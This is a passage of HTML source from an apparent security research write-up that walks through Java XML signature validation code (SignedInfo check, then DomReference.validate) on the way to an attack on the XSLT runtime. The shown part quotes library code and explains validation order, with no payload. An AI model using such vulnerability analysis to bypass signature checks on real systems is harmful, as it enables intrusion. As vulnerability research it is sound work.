pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Reference&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;ref&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; refs&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;.&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;get&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;i&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;boolean&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; refValid &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;ref&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;.&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;validate&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;vc&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;);&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;B&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;LOG&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;.&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;debug&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;\"Reference [{}] is valid: {}\"&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;,&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;ref&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;.&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;getURI&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(),&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; refValid&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;validateRefs &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;amp;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; refValid&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;if&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(!&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;validateRefs&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;)&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;LOG&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;.&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;debug&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;\"Couldn't validate the References\"&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;validationStatus &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;false&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;validated &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;true&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;return&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; validationStatus&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;[..]&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;As we can see, the &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;validate&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; method first validates the signature of the &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;SignedInfo&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; element in (A) before validating all the references in (B).&amp;nbsp; This means that an attack against the XSLT runtime will require a valid signature for the &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;SignedInfo&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; element and we’ll discuss later how an attacker can bypass this requirement.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The call to &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;ref.validate()&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; in (B) ends up in the &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;DomReference.validate&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; method shown below:&lt;/span&gt;&lt;/p&gt;&lt;div align=\"left\" dir=\"ltr\" style=\"margin-left: 0pt;\"&gt;&lt;table style=\"border-collapse: collapse; border: none;\"&gt;&lt;colgroup&gt;&lt;/colgroup&gt;&lt;tbody&gt;&lt;tr style=\"height: 0pt;\"&gt;&lt;td style=\"background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;public&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;boolean&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; validate&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;XMLValidateContext&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; validateContext&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;throws&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;XMLSignatureException&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;if&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;validateContext &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: 